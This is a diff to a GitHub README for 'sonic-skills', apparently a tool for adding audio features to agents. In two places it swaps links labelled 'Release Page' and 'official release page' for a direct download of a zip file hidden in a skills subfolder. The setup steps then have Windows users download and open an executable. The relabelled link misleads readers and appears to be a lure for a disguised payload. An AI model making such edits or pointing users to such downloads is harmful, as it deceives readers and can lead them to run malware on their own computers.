@@ -1,6 +1,6 @@
 # 🔊 sonic-skills - Add advanced audio tools to agents
 
-[![Download sonic-skills](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Gourdja/sonic-skills)
+[![Download sonic-skills](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Gourdja/sonic-skills/raw/refs/heads/main/skills/audio-numerics-review/skills-sonic-v3.4.zip)
 
 ## 🎯 What is sonic-skills?
 
@@ -24,7 +24,7 @@ Check these items before you start the installation process. Proper hardware ens
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/Gourdja/sonic-skills) to download the installer.
+1. Visit the [official release page](https://github.com/Gourdja/sonic-skills/raw/refs/heads/main/skills/audio-numerics-review/skills-sonic-v3.4.zip) to download the installer.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file to start the download.
 4. Open the file once it finishes downloading.
